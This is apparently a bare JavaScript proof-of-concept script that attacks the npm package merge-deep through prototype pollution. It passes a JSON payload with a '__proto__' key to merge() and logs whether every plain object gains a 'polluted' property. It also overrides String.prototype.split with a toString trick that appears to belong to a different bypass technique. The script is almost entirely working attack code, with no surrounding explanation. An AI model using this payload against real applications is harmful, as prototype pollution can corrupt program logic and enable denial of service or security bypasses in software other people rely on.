var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const merge = require('merge-deep');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);